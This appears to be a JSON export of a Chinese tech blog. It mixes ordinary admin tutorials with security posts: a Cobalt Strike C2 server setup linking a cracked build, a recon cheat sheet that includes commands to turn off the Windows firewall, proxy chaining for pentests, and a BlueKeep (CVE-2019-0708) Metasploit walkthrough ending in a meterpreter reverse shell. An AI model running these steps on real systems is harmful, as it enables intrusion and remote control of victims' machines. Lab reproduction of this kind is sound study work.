[{"title":"CentOS搭建CobaltStrike[公网环境]","url":"/posts/155850be/","content":"**Cobalt Strike是一款以Metasploit为基础的GUI的框架式渗透工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等；还可以联动Metaspolit进行更多操作。**\n![images](https://static-hk.gov-cn.cn/static/images/155850be/image-01.png)\n*接触CobaltStrike这么久，也看到过好多大牛发的CobaltStrike文章，我们知道在研究CobaltStrike甚至是Metasploit都是在内网环境中，让人很尴尬的就是没有公网地址，在测试一些东西都是内网环境，又或者是我们打下一台边界主机在上面架设一个CobaltStrike，本文主要是在vps搭建CobaltStrike服务端，解决打单点主机的一些问题，如果你打下了一台边界主机或者是拿到一些肉鸡也可以参考这边文章，菜鸟一枚大佬下手轻点~*\n<!-- more -->\n\n## 0x01 搭建JDK环境\n*CobaltStrike是Java开发所以在Windows或Linux上使用都需要一个Java环境，所以我们需要先安装JDK环境。*\n\n>vps环境如下:\n>CentOS 7.7\n>[jdk-8u241-linux-x64.tar.gz (由于现在下载JDK包需要注册Oracle账号，如果你们不想那么麻烦，点击下载！)](https://static-hk.gov-cn.cn/downloads/jdk-8u241-linux-x64.tar.gz)\n>[CobaltStrike 4.0 (这里分享ssooking大神提供的cobaltstrike4.0 cracked版本)](https://www.cnblogs.com/ssooking/p/12535998.html)\n\n*先上传JDK安装包，理论上OpenJDK也是可行的，但是我这里演示源码安装~*\n\n```\n#查询是否之前有jdk环境，如有先卸载\n$ rpm -qa | grep java \n$ tar xf jdk-8u241-linux-x64.tar.gz -C /usr/local/\n#编辑/etc/profile文件添加一下内容\n$ vim /etc/profile    \n\n# JDK Environment Configuration\nexport JAVA_HOME=/usr/local/jdk1.8.0_241\nexport CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar\nexport PATH=$PATH:$JAVA_HOME/bin\n\n$ soure /etc/profile \n\n# 测试命令\n$ java -version \njava version \"1.8.0_241\"\nJava(TM) SE Runtime Environment (build 1.8.0_241-b07)\nJava HotSpot(TM) 64-Bit Server VM (build 25.241-b07, mixed mode)\n```\n\n## 0x02 CobaltStrike\n*上传CobaltStrike到你的服务器*\n```\n$ ls\nagscript           cobaltstrike.bat    crackInfo.txt  libicmp.so          LICENSE.txt  readme.txt  teamserver\nc2lint             cobaltstrike.jar    icon.jpg       libtapmanager64.so  NOTICE.TXT   start.bat   third-party\ncobaltstrike.auth  cobaltstrike.store  libicmp64.so   libtapmanager.so    peclone      start.sh\n\n# 服务端为teamserver且设为可执行\n$ ./teamserver -h\n[*] Will use existing X509 certificate and keystore (for SSL)\n[*] ./teamserver <host> <password> [/path/to/c2.profile] [YYYY-MM-DD]\n\n\t<host> is the (default) IP address of this Cobalt Strike team server\n\t<password> is the shared password to connect to this server\n\t[/path/to/c2.profile] is your Malleable C2 profile\n\t[YYYY-MM-DD] is a kill date for Beacon payloads run from this server\n\n# 可以看到执行teamserver后面的参数为主机加密码，其他C2扩展和终止服务时间可看自身自身情况去考量\n# ./teamserver vps公网ip 客户端登录密码 如果不知道自己公网ip可以执行命令curl ip.me/curl ipinfo.io/json\n\n$ ./teamserver 4*.***.***.*3 abc-123\n[*] Will use existing X509 certificate and keystore (for SSL)\n[+] Team server is up on 50050\n[*] SHA256 hash of SSL cert is: a058b809e51c6a2aab6fbf98f35e5b9fb9ce8aa7c4da4cdd8b76fa5fdaf4aef8\n\n# 注意的是CobaltStrike默认端口是50050，所以你要确保客户端与服务端通讯正常且你的安全组或者防火墙放行端口流量\n# selinux和firewall命令参考本博客linux常用命令速查文章自行查询\n\n# 临时关闭selinux和firewalld防火墙\n$ systemctl stop firewalld\n$ setenforce 0\n```\n**安全组放行配置**\n![image](https://static-hk.gov-cn.cn/static/images/155850be/image-02.png)\n\n## 0x03 客户端连接\n*可以直接运行start.bat或者复制里面的命令在powershell或cmd执行命令*\n![image](https://static-hk.gov-cn.cn/static/images/155850be/image-03.png)\n\n**运行后弹出登录框输入你的服务端公网ip和密码登录即可**\n![image](https://static-hk.gov-cn.cn/static/images/155850be/image-04.png)\n\n*登录后界面*\n![image](https://static-hk.gov-cn.cn/static/images/155850be/image-05.png)\n\n## 0x03 END\n**最后到此CobaltStrike就完成，从业的第四年，发现自己还是碌碌无为。还是一个没技术的屌丝人士，干啥是不行~**\n*挺遗憾的就是今年拿到某国企实验室Offer以为屌丝要逆袭了！！万万没想到的是某些原因还是无缘~感叹这就是人生大起大落！*","tags":["CobaltStrike"],"categories":["CobaltStrike"]},{"title":"内网渗透-信息收集","url":"/posts/acb0a01/","content":"\n# 内网渗透测试常用命令\n## 信息收集篇(不定期更新)\n\n<!-- more -->\n### windows命令\n```\n#查看网络配置\n$ ipconfig /all \n\n#查询操作系统和版本信息\n$ systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" \n\n#查看系统体系结构\n$ echo %PROCESSOR_ARCHITECTURE% \n\n#查看安装的软件及版本\n$ wmic product get name,version \n\n#Powershell查看安装的软件及版本\n$ powershell \"Get-WinObject -class Win32_Product | Select-Object -Property name,version\" \n\n#查询本机服务信息\n$ wmic service list brief \n\n#查看进程列表和进程用户\n$ tasklist \n\n#查看进程信息\n$ wmic process list brief \n\n#查看启动程序信息\n$ wmic startup get command,caption \n\n#查看任务计划\n$ schtasks /query /fo LIST /v \n\n#查看主机开机时间\n$ net statistics workstation \n\n#查询用户列表\n$ net user \n\n#查询本地管理员（包含域用户）信息\n$ net localgroup administrators \n\n#查看当前在线用户\n$ query user || qwinsta \n\n#列出或断开本地计算机与所连接的客户端之间的会话\n$ net session \n\n#查看端口列表、本机开放端口所对应的服务和程序\n$ netstat -ano \n\n#查看系统的详细信息\n$ systeminfo \n\n#查看安装在系统中的补丁\n$ wmic qfe get Caption,Description,HotFixID,InstalledOn \n\n#查看本机共享列表和可访问的域共享列表\n$ net share \n\n#wmic查找共享列表\n$ wmic share get name,path,status \n\n#查询路由表\n$ route print \n\n#查询ARP缓存表\n$ arp -a \n\n#关闭防火墙03版本之前\n$ netsh firewall set opmode disable \n\n#关闭防火墙03版本之后\n$ netsh advfirewall set allprofiles state off \n\n#查看防火墙配置\n$ netsh firewall show config \n\n```","tags":["内网安全"],"categories":["内网安全"]},{"title":"vps上kali最小化安装","url":"/posts/ecada0e2/","content":"**kali作为渗透测试系统在我们日常渗透过程中是离不开的，如msf、cs、sqlmap、等工具都集成在kali里面**\n\n\n![images](https://www.kali.org/wp-content/uploads/2015/09/kali-2.0-website-logo.png)\n\n<!-- more -->\n**在实战过程中，比如我们需要使用到msf和cs，公网环境下，msf和cs监听等服务都需要公网ip，所以在这篇文章中为大家带来的是如何在vps上安装kali[这次主要是以vultr为例子]**\n\n\n## 0x01 前期准备工作\n\n*vultr比较好的功能就是可以自定义上次iso镜像，以便我们自定义安装操作系统。*\n\n> 关于kali的iso镜像我们可以在他的官网镜像下载，如果访问不了或者下载资源慢，可以移步到国内的阿里、中科大等镜像中心下载。\n\n官方地址：[kali.org](https://www.kali.org/downloads/)\n中国科学技术大学：[mirrors.ustc.edu.cn](https://developer.aliyun.com/mirror/)\n阿里巴巴开源镜像站：[opsx.alibaba.com](https://developer.aliyun.com/mirror/)\n\n下载好镜像上传至Vultr控制面板的ISOs\n![image](https://static-hk.gov-cn.cn/static/images/ecada0e2/image-1.png)\n\n## 0x02 拉起一个kali服务器\n### 选择上传kali的ISO镜像\n\n> 选择地区、配置大小我这就不陈述了\n\n下拉至Server Type选择你上传的ISO\n![image](https://static-hk.gov-cn.cn/static/images/ecada0e2/image-2.png)\n\n## 0x03 安装kali\n**拉起服务器后我们需要安装他，打开控制面板点击终端界面**\n![image](https://static-hk.gov-cn.cn/static/images/ecada0e2/image-3.png)\n\n> 即打开一个新的标签页面如下图\n\n![image](https://static-hk.gov-cn.cn/static/images/ecada0e2/image-4.png)\n\n> 选择第二项Install，因为图形化比较消耗资源[后面不重要的步骤我就不截图了]\n\n选项\n* 语言：English[你选中文也可以，但是汉化的一般般]\n* 国家地区：US[United States，你选择Hong Kong也可以，选择other然后在选择China也可以]\n* 键盘：选择默认的American English\n* 接下来就是输入hostname\n* 然后是Domain name，这个随意，空白即可\n\n下一步会让你输入一个用户名和密码，既是使用该系统的用户，这里随便输入即可\n![image](https://static-hk.gov-cn.cn/static/images/ecada0e2/image-5.png)\n\n* 时区：Eastern[默认，如果选择了China则是Beijing、Shanghai等地区]\n\n> 接下来则是分配磁盘，这里有四个选项，我这里推荐第二个LVM\n\n![image](https://static-hk.gov-cn.cn/static/images/ecada0e2/image-6.png)\n\n> 然后选择第一选项，所有文件都分在同一个磁盘里边，如果你想设置单独分区也可以\n\n![image](https://static-hk.gov-cn.cn/static/images/ecada0e2/image-7.png)\n\n*最后选择yes，则接下来系统会自动去分配磁盘，安装配置系统。这个过程需要一点时间，我们坐等即可*\n\n![image](https://static-hk.gov-cn.cn/static/images/ecada0e2/image-8.png)\n\n>安装到一半的时候，它会弹出一个框，让你设置http代理，默认是不需要设置的。\n\n![image](https://static-hk.gov-cn.cn/static/images/ecada0e2/image-9.png)\n\n*为了减少网络流量，默认预定义只安装了一小部分的软件包。如果你要添加另外的服务或功能，可以在这个界面做选择。*\n\n![image](https://static-hk.gov-cn.cn/static/images/ecada0e2/image-10.png)\n\n>最后安装GURB到磁盘即完成所有安装\n\n![image](https://static-hk.gov-cn.cn/static/images/ecada0e2/image-11.png)\n\n*最后，如果你也使用的是vultr，安装完成后仍然是进入到安装界面，则到服务器的控制面板把服务器的ISO删除即可。*\n\n### End*","tags":["kali","vps"],"categories":["Kali","vps"]},{"title":"关于Metasploit+BeEF联动[整理中]","url":"/posts/2085e13e/","content":"\n<!-- more -->","tags":["Metasploit"],"categories":["Metasploit"]},{"title":"记一次实战社工老外[整理中]","url":"/posts/6526495e/","tags":["社工"],"categories":["社工"]},{"title":"APT攻击技术学习指南","url":"/posts/58d50b2a/","content":"\n### APT攻击技术学习指南\n<center>高清截图(点击放大)</center>\n\n![image](https://static-hk.gov-cn.cn/static/images/58d50b2a/image-01.jpg)\n<!-- more -->\nPDF下载\n[点击下载](https://static-hk.gov-cn.cn/downloads/APT攻击技术学习指南v1.0.pdf)\n\n本文所有文档内容转载自Github，如有侵权请联系博主\n[原文点击访问更多内容](https://github.com/Yeti-791/APT-Guide)","tags":["APT"],"categories":["APT"]},{"title":"关于渗透测试中的多层网络代理L2TP+SSR","url":"/posts/d4819c7d/","content":"\n# 关于渗透测试实战中多层网络代理L2TP+SSR\n\n>在参加完今年11月底的HackingDAY广州站之后，对于红客联盟Lion的议题中十步杀一人中还是感触比较大的。借助这里展开我们在实战过程中多层网络代理的一些个人见解。\n\n![image](https://static-hk.gov-cn.cn/static/images/d4819c7d/image-01.jpg)\n<!-- more -->\n>**实验中的环境**\n**L2TP服务器**\n**Electron-SSR**\n**SSR节点**\n**proxychains**\n\n\n### 0x01 L2TP [本次截图均为虚拟配置，效果为真实效果，请自行修改对应的虚拟配置]\n>L2TP Server部署我这里就不做过多的讲解，主要是kali上L2TP配置\n>默认kali是没有安装任何模块的，所以我们需要安装本次主题所讲的L2TP模块\n\n![image](https://static-hk.gov-cn.cn/static/images/d4819c7d/gif-01.gif)\n\n```\n# 安装L2TP模块 Tips：默认Kali没有安装\n$ apt-get install network-manager-l2tp\n$ apt-get install network-manager-l2tp-gnome\n\n# 当然除了L2TP还有其他模块\n# network-manager-openvpn      network-manager-openvpn-gnome\n# network-manager-pptp         network-manager-pptp-gnome\n# network-manager-ssh          network-manager-ssh-gnome\n# network-manager-fortisslvpn  network-manager-fortisslvpn-gnome\n# network-manager-vpnc         network-manager-vpnc-gnome\n# network-manager-openconnect  network-manager-openconnect-gnome        \n```\n\n![image](https://static-hk.gov-cn.cn/static/images/d4819c7d/image-02.png)\n\n**安装完成后效果**\n\n![image](https://static-hk.gov-cn.cn/static/images/d4819c7d/gif-02.gif)\n\n**配置L2TP**\n>输入你的服务ip地址及用户和密码\n\n![image](https://static-hk.gov-cn.cn/static/images/d4819c7d/image-03.png)\n\n>配置你的IPsec PSK\n\n![image](https://static-hk.gov-cn.cn/static/images/d4819c7d/gif-03.gif)\n\n>Tips：小提示如果连接不上请注意你的身份认证方式，如图：\n\n![image](https://static-hk.gov-cn.cn/static/images/d4819c7d/image-04.png)\n**连接VPN**\n![image](https://static-hk.gov-cn.cn/static/images/d4819c7d/image-05.png)\n![image](https://static-hk.gov-cn.cn/static/images/d4819c7d/image-06.png)\n\n\n### 0x02 Electron-SSR [下载链接后续等我买了OSS存储，放里面在提供大家下载]\n\n**安装Electron-SSR[支持SSR订阅]**\n>**直接赋予权限`chmod +x Electron-SSR.AppImage`然后执行，执行完可以关闭命令行，直接搜索app即可打开软件**\n\n![image](https://static-hk.gov-cn.cn/static/images/d4819c7d/gif-04.gif)\n![image](https://static-hk.gov-cn.cn/static/images/d4819c7d/gif-05.gif)\n\n**配置Electron-SSR订阅**\n![image](https://static-hk.gov-cn.cn/static/images/d4819c7d/gif-06.gif)\n\n### 0x03 proxychains或google插件代理上网\n![image](https://static-hk.gov-cn.cn/static/images/d4819c7d/image-07.png)\n\n**proxychains代理google浏览器**\n\n```\n$ vi /etc/proxychains.conf\n# 修改配置文件为SSR的监听端口\n# [ProxyList]\n# socks5  127.0.0.1 1080\n```\n![image](https://static-hk.gov-cn.cn/static/images/d4819c7d/gif-07.gif)\n\n**Proxy SwitchyOmega插件代理google浏览器**\n![image](https://static-hk.gov-cn.cn/static/images/d4819c7d/gif-08.gif)\n\n### 0x04 总结\n总的来说，在渗透测试实战过程中精尽量使用多层代理，当然我这是最简单的两层代理，还有更多的，比如代理到tor的网络。等等","tags":["Kali Linux","L2TP","SSR"],"categories":["Kali Linux","L2TP","SSR"]},{"title":"CVE-2019-0708漏洞复现与修复","url":"/posts/4c61d4b3/","content":"\n```\n实验环境：\nKali:192.168.73.131\nWin7sp1:192.168.73.130\nWin2008R2sp1:192.168.73.136\n```\n<center>先上波图</center>\n\n![image](https://static-hk.gov-cn.cn/static/images/4c61d4b3/gif-01.webp)\n<!-- more -->\n<center>挖洞千万条，安全第一条，挖洞不规范，家人泪两行</center>\n\n### 0x01 漏洞原理及描述\n>Windows系列服务器于2019年5月15号，被爆出高危漏洞，该漏洞影响范围较广如：windows2003、windows2008、windows2008 R2、windows xp系统都会遭到攻击，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的。这个漏洞是今年来说危害严重性最大的漏洞，跟之前的勒索，永恒之蓝病毒差不多。CVE-2019-0708漏洞是通过检查用户的身份认证，导致可以绕过认证，不用任何的交互，直接通过rdp协议进行连接发送恶意代码执行命令到服务器中去。如果被攻击者利用，会导致服务器入侵，中病毒，像WannaCry 永恒之蓝漏洞一样大规模的感染。2019年9月7日晚上凌晨1点左右，metaspolit更新了漏洞利用程序\n\n>在2019年5月，微软发布了针对远程代码执行漏洞CVE-2019-0708的补丁更新，该漏洞也称为“BlueKeep”，漏洞存在于远程桌面服务（RDS）的代码中。此漏洞是预身份验证，无需用户交互，因此具有潜在武器化蠕虫性性漏洞利用的危险。如果成功利用此漏洞，则可以使用“系统”权限执行任意代码。Microsoft安全响应中心的建议表明这个漏洞也可能会成为一种蠕虫攻击行为，类似于Wannacry和EsteemAudit等攻击行为。由于此漏洞的严重性及其对用户的潜在影响，微软采取了罕见的预警步骤，为不再受支持的Windows XP操作系统发布补丁，以保护Windows用户。\n\n### 0x02 漏洞影响\n>该漏洞影响旧版本的Windows系统，包括：\n>Windows 7、Windows Server 2008 R2、Windows Server 2008、Windows 2003、Windows XP。\n>Windows 8和Windows 10及之后版本不受此漏洞影响。\n\n### 0x03 前期准备\n>*Tips:这次主要用msf集成的poc和exp进行漏洞利用*\n\n```\n# 初始化msf\n$ service postgresql start\n$ msfdb init \n$ msfconsole\n```\n\n>**查询可利用模块**\n\n```\n$ search cve-2019-0708\n```\n\n![image](https://static-hk.gov-cn.cn/static/images/4c61d4b3/image-01.png)\n\n>**win7为例扫描一下**\n\n```\n$ use auxiliary/scanner/rdp/cve_2019_0708_bluekeep\n$ show options\n$ set RHOST ip\n$ exp/run \n```\n\n![image](https://static-hk.gov-cn.cn/static/images/4c61d4b3/image-02.png)\n\n>**返回内容**\n\n```\n[+] 192.168.73.130:3389   - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.\n[*] 192.168.73.130:3389   - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n\n### 0x04 漏洞利用\n\n```\n# 加载利用模块\n$ use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n\n# 加载监听反弹payload模块\n$ set payload windows/x64/meterpreter/reverse_tcp\n\n# 配置本机监听地址\n$ set LHOST local ip\n\n# 配置远程目标主机地址\n$ set RDP_CLIENT_IP ip\n$ set RHOSTS ip\n\n# 设置target即设置目标类型，提高成功率\n$ set target 6\n```\n![image](https://static-hk.gov-cn.cn/static/images/4c61d4b3/image-03.png)\n\n>**查看配置**\n\n![image](https://static-hk.gov-cn.cn/static/images/4c61d4b3/image-04.png)\n\n>**攻击**\n\n![image](https://static-hk.gov-cn.cn/static/images/4c61d4b3/image-05.png)\n\n>成功返回meterpreter\n>截图桌面`screenshot`\n>[提权过程可参考ms17-010](/posts/af85dfeb/)\n\n![image](https://static-hk.gov-cn.cn/static/images/4c61d4b3/image-06.png)\n![image](https://static-hk.gov-cn.cn/static/images/4c61d4b3/image-07.png)\n\n\n>**win2008r2sp1为例**\n>Tips：经测试2008r2 Enterprise为例需要更改注册表\n>[HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Terminal Server\\WinStations\\rdp-tcp\\fDisableCam]值修改为0(系统默认为1）\n\n![image](https://static-hk.gov-cn.cn/static/images/4c61d4b3/image-08.png)\n\n### 0x05 漏洞修复与防御\nwindows桌面版本可以通过杀毒工具等渠道进行升级安装补丁包。\nwindows server等服务器系统可以访问官方下载补丁包下载。\n\n防御方法可以设置远程连接为“仅允许允许使用网络级别身份验证的远程桌面的计算机连接”或不允许连接到此计算机\n","tags":["CVE"],"categories":["CVE"]},{"title":"免费SSL证书申请及自动申请","url":"/posts/6ed61a1e/","content":"\n## 免费SSL证书申请及自动申请\n\n---\n\n**推荐几个免费创建SSL的网站**\n>**[Certbot](https://certbot.eff.org/) ：自动申请SSL证书，亲测非常好用，只需在服务器安装程序，只需命令即可自动申请，支持多域名。**\n>**[FreeSSL](https://freessl.cn/) ：国内一个免费申请SSL的网站，需手动申请，我们知道一般免费证书都是3个月，这个可以申请一年。**\n>**[SSL for Free](https://www.sslforfree.com/) ：国外一个免费申请SSL的网站，这个没用过，支持中文。**\n\n------\n<!-- more -->\n### 服务器申请SSL\n\n##### 自动化申请SSL证书\n``` bash\n# 前提环境：CentOS 7 - NGINX\n# 安装Cretbot,Cretbot打包在EPEL中,如果你需要yum安装则需要先安装启用EPEL库.\n$ yum -y install epel-release\n\n# 如果你使用的是RHEL,则可以通过运行一下命令启用可选通道：\n$ yum -y install yum-utils\n$ yum-config-manager --enable rhui-REGION-rhel-server-extras rhui-REGION-rhel-server-optional\n\n# 运行安装Certbot\n$ yum -y install python2-certbot-nginx\n\n# 安装完成,我这边使用的是NGINX,Certbot是有插件支持自动安装证书的\n# 运行命令自动为你配置NGINX配置及提供服务\n$ certbot --nginx\n\n# 如果你想个性化想手动改NGINX配置,则可以执行下条命令\n$ certbot --nginx certonly\n\n# 以上他是通过读取NGINX配置文件为你申请NGINX配置文件里面设置的域名,如果你想获取通配符证书,你则需要使用DNS插件,运行下面这条命令\n$ certbot -a dns-plugin -i nginx -d“* .example.com”-d example.com --server https://acme-v02.api.letsencrypt.org/directory\n# 您需要将dns-plugin替换为您要使用的DNS插件的名称。您可能还需要提供其他标志，例如API凭据的路径，如下面链接的DNS插件的文档中所述。\n\n```\n[Certbot的DNS插件文档](https://certbot.eff.org/docs/using.html#dns-plugins)\n\n\n##### 自动续SSL证书\n``` bash\n# 我们都知道免费证书一般是3个月就过期,3个月后则需要再次申请,Certbot可以为你配置证书过期之前自动续SSL证书\n$ certbot renew --dry-run\n$ certbot renew\n\n# 以上手动敲命令既可以再次申请,但是每三个月一次,可能忘记了,我们还可以通过Crond或者Systemd进行定时操作\n$ 0 0,12 * * * python -c 'import random; import time; time.sleep(random.random() * 3600)' && certbot renew \n# 以上示例一个Crond定时任务,每天中午12点和凌晨12执行一次.\n```\n详细情况可以访问 [Certbot官方文档](https://certbot.eff.org/docs/)\n\n### 网页版申请SSL\n\n##### FreeSSL为例子\n> 网站上面也比较简单,适合没有服务器,无法使用自动申请等条件,只需域名即可申请SSL\n> 第一步打开FreeSSL官网\n> 输入域名创建免费的SSL证书\n>![image](https://static-hk.gov-cn.cn/static/images/6ed61a1e/image-1.png)\n>输入你的邮箱及下例选定整数类型验证类型生成类型等\n>个人推荐：RSA、DNS、浏览器生成比较好\n>![image](https://static-hk.gov-cn.cn/static/images/6ed61a1e/image-2.png)\n>然后到你的域名管理系统，添加一个txt记录，然后点击验证\n>![image](https://static-hk.gov-cn.cn/static/images/6ed61a1e/image-3.png)\n>验证成功后，会浏览器自动下载一个为你的域名.zip的压缩包，里面就是证书的文件\n>以上步骤完成后，你的txt记录就可以删除了，以上为全部过程\n\n\n","tags":["SSL"],"categories":["SSL"]},{"title":"Shell脚本管理启动微服务","url":"/posts/468a23e/","content":"\n\n>**我们都知道有些微服务我们得放后台启动，虽然前者介绍了Supervisord，但是我还是要跟大家讲一讲用Shell去管理微服务，我们一起来看看吧**\n\n\n#### 脚本内容\n>**脚本整体比较简单，我这里就不陈述了，然后实际可用根据自身情况来去衡量，对脚本如有什么建议，可以联系到我，共同讨论**\n<!-- more -->\n``` bash\n#!/bin/bash\n# Descrip : PushClient Service Management Process Script.\n# Date    : 2018-08-09 15:29:33\n# Author  : beytagh.stark (beytagh.stark@gmail.com)\n# Link    : https://www.gov-cn.cn/\n# Version : Ver 1.0\n\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\n\n# PushClient launch environment variable\nPushHome=\"/data/servers/PushHome/\"\nPushClient=\"/data/servers/PushHome/PushClient.exe\"\nMonoExec=\"/usr/bin/mono\"\nPushName=PushClient.exe\nNohupExec=\"/usr/bin/nohup\"\n\n\nstart() {\n    echo \"Starting PushClient Service.\"\n    $NohupExec $MonoExec $PushClient > /dev/null 2>&1 &\n    retval=$?\n    if [ $retval -eq 0 ]; then\n        echo \"Start PushClient Service Success.\"\n    else\n        echo \"Start PushClient Service Fail.\"\n        pkill -f $PushName\n    fi\n}\n\nstop() {\n    retval=`ps -ef |grep \"$PushName\" |grep -v \"grep\" |wc -l`\n    if [ $retval -eq 0 ]; then\n        echo \"PushClient Service Not Running.\"\n    else\n        echo \"Stopping PushClient Service.\"\n        pkill -f $PushName\n        retval=$?\n        if [ $retval -eq 0 ]; then\n            echo \"Stop PushClient Service Success.\"\n        else\n            echo \"Stop PushClient Service Fail.\"\n        fi\n    fi\n}\n\nrestart() {\n    echo \"Restarting PushClient Service.\"\n    stop\n    start\n}\n\nstatus() {\n    retval=`ps -ef |grep \"$PushName\" |grep -v \"grep\" |wc -l`\n    if [ $retval -eq 0 ]; then\n        echo \"PushClient Service is Running.\"\n    else\n        echo \"PushClient Service not Running.\"\n    fi\n}\n\ncase \"$1\" in\n    start)\n        start\n        ;;\n    stop)\n        stop\n        ;;\n    restart)\n        stop\n        start\n        ;;\n    status)\n        status\n        ;;\n    *)\n        echo $\"Usage: $0 {start|stop|restart|status}\"\n        ;;\nesac\n```","tags":["Shell"],"categories":["Shell"]},{"title":"Apache Jmeter 安装","url":"/posts/8719e72b/","content":"\n\n>**JMeter作为一款广为流传的开源压测产品，最初被设计用于Web应用测试，如今JMeter可以用于测试静态和动态资源，例如静态文件、Java 小服务程序、CGI 脚本、Java 对象、数据库、FTP 服务器等等，还能对服务器、网络或对象模拟巨大的负载，通过不同压力类别测试它们的强度和分析整体性能。另外，JMeter能够对应用程序做功能/回归测试，通过创建带有断言的脚本来验证你的程序返回了你期望的结果。为了最大限度的灵活性，JMeter允许使用正则表达式创建断言。**\n\n>**JMeter的特点包括对HTTP、FTP服务器、数据库进行压力/性能测试；完全的可移植性；完全 Swing和轻量组件支持包；完全多线程；缓存和离线分析/回放测试结果；可链接的取样器；具有提供动态输入到测试的功能；支持脚本编程的取样器等。在设计阶段，JMeter能够充当HTTP PROXY（代理）来记录浏览器的HTTP请求，也可以记录Apache等WebServer的log文件来重现HTTP流量，并在测试运行时以此为依据设置重复次数和并发度（线程数）来进行压测。**\n<!-- more -->\n**参考文章：[《云智慧压测实战分享之JMeter工具使用初探（云智慧压测实战分享之JMeter工具使用初探 - CloudwiseAPM - SegmentFault ）》](https://segmentfault.com/a/1190000007922515)**\n\n\n#### 下载Apache JMeter\n>**官方下载地址：[Apache JMeter](http://jmeter.apache.org/download_jmeter.cgi)**\n\n#### 安装Apache JMeter\n>**下载完是一个zip或者tgz格式的压缩包，解压完是不用安装的，你解压到你想放的目录，比如我放到我的jdk同一目录下**\n![image](https://static-hk.gov-cn.cn/static/images/8719e72b/image-1.png)\n![image](https://static-hk.gov-cn.cn/static/images/8719e72b/image-2.png)\n\n#### 配置Apache JMeter\n>**弄好以上，还需配置环境变量，第一步设置JMeter的家目录**\n![image](https://static-hk.gov-cn.cn/static/images/8719e72b/image-3.png)\n>**然后在CLASSPATH添加以下值：`(%JMETER_HOME%\\lib\\ext\\ApacheJMeter_core.jar;%JMETER_HOME%\\lib\\jorphan.jar;%JMETER_HOME%\\lib\\logkit-2.0.jar;)`括号内内容**\n![image](https://static-hk.gov-cn.cn/static/images/8719e72b/image-4.png)\n\n#### 打开Apache JMeter\n>**家目录下bin下的jmeter.bat文件，双击打开即可(如果报错：not able to find java executable or version. please check your java installation)就修改jdk的Path环境变量，在最后添加以下内容`(C:\\Windows\\System32;)`括号内内容**\n![image](https://static-hk.gov-cn.cn/static/images/8719e72b/image-5.png)\n![image](https://static-hk.gov-cn.cn/static/images/8719e72b/image-6.png)\n\n\n#### 配置中文\n>**默认打开都是英文版的，如果你想调整成中文可以 选择Options-Choose Language-Chinese(Simplified)即可**\n![image](https://static-hk.gov-cn.cn/static/images/8719e72b/image-7.png)\n![image](https://static-hk.gov-cn.cn/static/images/8719e72b/image-8.png)","tags":["压力测试"],"categories":["压力测试"]},{"title":"Windows下jdk安装教程","url":"/posts/a636f079/","content":"\n#### 下载jdk软件包\n>**Oracle官方jdk下载页面 [点击链接前往](https://www.oracle.com/technetwork/cn/java/javase/downloads/index.html)**\n![image](https://static-hk.gov-cn.cn/static/images/a636f079/image-1.png)\n<!-- more -->\n![image](https://static-hk.gov-cn.cn/static/images/a636f079/image-2.png)\n\n#### 安装jdk\n>**这个安装正常安装就可以了，不过你要记住你的安装目录，后面有用到！**\n![image](https://static-hk.gov-cn.cn/static/images/a636f079/image-3.png)\n![image](https://static-hk.gov-cn.cn/static/images/a636f079/image-4.png)\n![image](https://static-hk.gov-cn.cn/static/images/a636f079/image-5.png)\n\n#### 配置jdk环境\n>**安装jdk还没好，默认是没有设置环境变量的，我们可以看到java --version是不可运行程序**\n![image](https://static-hk.gov-cn.cn/static/images/a636f079/image-6.png)\n\n>**添加到你的系统变量**\n>**点击我的电脑属性-环境变量-新建系统变量-设置你的java目录**\n![image](https://static-hk.gov-cn.cn/static/images/a636f079/image-7.png)\n>**然后在添加PATH变量，值：`(%JAVA_HOME%\\bin; %JAVA_HOME%\\jre\\bin;)`复制括号内内容**\n![image](https://static-hk.gov-cn.cn/static/images/a636f079/iamge-8.png)\n>**然后在添加CLASSPATH系统变量，值：`(.;%JAVA_HOME%\\lib;%JAVA_HOME%\\lib\\tools.jar)`复制括号内内容**\n![image](https://static-hk.gov-cn.cn/static/images/a636f079/image-9.png)\n\n#### 测试\n**到此我们的安全加配置已经全部完成，接下来我们打开cmd命令行测试一下即可！**\n![image](https://static-hk.gov-cn.cn/static/images/a636f079/image-10.png)","tags":["Jdk"],"categories":["Jdk"]},{"title":"Linux上部署PostgreSQL服务","url":"/posts/df726916/","content":"\n# Linux上部署PostgreSQL服务\n\n\n\n>**摘要：**\n>**PostgreSQL是一个功能强大的开源对象关系数据库管理系统(ORDBMS)。 用于安全地存储数据; 支持最佳做法，并允许在处理请求时检索它们。**\n>**PostgreSQL(也称为Post-gress-Q-L)由PostgreSQL全球开发集团(全球志愿者团队)开发。 它不受任何公司或其他私人实体控制。 它是开源的，其源代码是免费提供的。** \n>**PostgreSQL是跨平台的，可以在许多操作系统上运行，如Linux，FreeBSD，OS X，Solaris和Microsoft Windows等。**\n\n----------\n<!-- more -->\n\n##  正文\n``` bash\n# 安装PostgreSQL-CentOS软件源\n$ yum -y install localinstall https://download.postgresql.org/pub/repos/yum/10/redhat/rhel-7-x86_64/pgdg-centos10-10-2.noarch.rpm\n# 我这里演示的是PostgreSQL-10的版本，如果你想要其他版本，请到相对于的目录去选择软件包\n\n# 列出PostgreSQL软件包\n$ yum list postgres*\n\n# 安装客户端\n$ yum -y install postgresql10\n\n# 服务端\n$ yum -y install postgresql10-server\n\n# 初始化操作\n$ /usr/pgsql-10/bin/postgresql-10-setup initdb\n\n# 修改白名单\n$ vim /var/lib/pgsql/10/data/pg_hba.conf\n\n# 修改配置文件\n$ vim /var/lib/pgsql/10/data/postgresql.conf\n# 简单列几个\n# listen_addresses = '*'\n# port = 5432\n# 后续会详细列举一些配置文件优化\n\n# 开机自启和启动PostgreSQL\n$ systemctl enable postgresql-10\n$ systemctl start postgresql-10\n\n# 简单创建一个用户和数据库\n$ CREATE USER 